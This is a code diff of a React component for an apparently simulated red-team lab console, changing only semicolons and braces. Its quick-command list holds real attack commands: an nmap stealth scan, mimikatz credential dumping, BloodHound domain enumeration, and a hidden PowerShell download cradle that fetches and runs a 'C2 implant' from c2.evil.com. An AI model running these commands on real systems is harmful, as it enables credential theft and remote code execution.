@@ -1,42 +1,42 @@
-import { useState, useEffect } from 'react'
-import { Terminal, Monitor, Globe, FileCode, Copy, Download, Upload, Settings, Maximize, Minimize } from '@phosphor-icons/react'
-import { Button } from '@/components/ui/button'
-import { Badge } from '@/components/ui/badge'
-import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
-import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
-import { Input } from '@/components/ui/input'
-import type { VM } from '@/types/virtual-lab'
+import { useState, useEffect } from 'react';
+import { Terminal, Monitor, Globe, FileCode, Copy, Download, Upload, Settings, Maximize, Minimize } from '@phosphor-icons/react';
+import { Button } from '@/components/ui/button';
+import { Badge } from '@/components/ui/badge';
+import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
+import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
+import { Input } from '@/components/ui/input';
+import type { VM } from '@/types/virtual-lab';
 
 interface Props {
   vm: VM
 }
 
 export function VMConsole({ vm }: Props) {
-  const [activeTab, setActiveTab] = useState('console')
+  const [activeTab, setActiveTab] = useState('console');
   const [commandHistory, setCommandHistory] = useState<string[]>([
     'Starting red team operations...',
     'Loading exploitation frameworks...',
     'Initializing stealth protocols...',
     'Ready for engagement.'
-  ])
-  const [currentCommand, setCurrentCommand] = useState('')
-  const [isFullscreen, setIsFullscreen] = useState(false)
-  const url = vm.consoleUrl || '#'
-  const isRunning = vm.status === 'running'
+  ]);
+  const [currentCommand, setCurrentCommand] = useState('');
+  const [isFullscreen, setIsFullscreen] = useState(false);
+  const url = vm.consoleUrl || '#';
+  const isRunning = vm.status === 'running';
 
   const executeCommand = () => {
-    if (!currentCommand.trim()) return
+    if (!currentCommand.trim()) {return;}
     
-    setCommandHistory(prev => [...prev, `> ${currentCommand}`, 'Command executed successfully.'])
-    setCurrentCommand('')
-  }
+    setCommandHistory(prev => [...prev, `> ${currentCommand}`, 'Command executed successfully.']);
+    setCurrentCommand('');
+  };
 
   const quickCommands = [
     { name: 'Network Scan', command: 'nmap -sS -sV target_network', description: 'Stealth TCP SYN scan' },
     { name: 'Credentials', command: 'mimikatz.exe "sekurlsa::logonpasswords"', description: 'Extract credentials from memory' },
     { name: 'Domain Enum', command: 'bloodhound-python -d domain.local -u user -p pass', description: 'Enumerate AD relationships' },
     { name: 'C2 Beacon', command: 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString(\'http://c2.evil.com/beacon\')"', description: 'Deploy C2 implant' }
-  ]
+  ];
 
   return (
     <Card className="glass-card h-[500px] flex flex-col">
@@ -177,5 +177,5 @@ export function VMConsole({ vm }: Props) {
         </Tabs>
       </CardContent>
     </Card>
-  )
+  );
 }
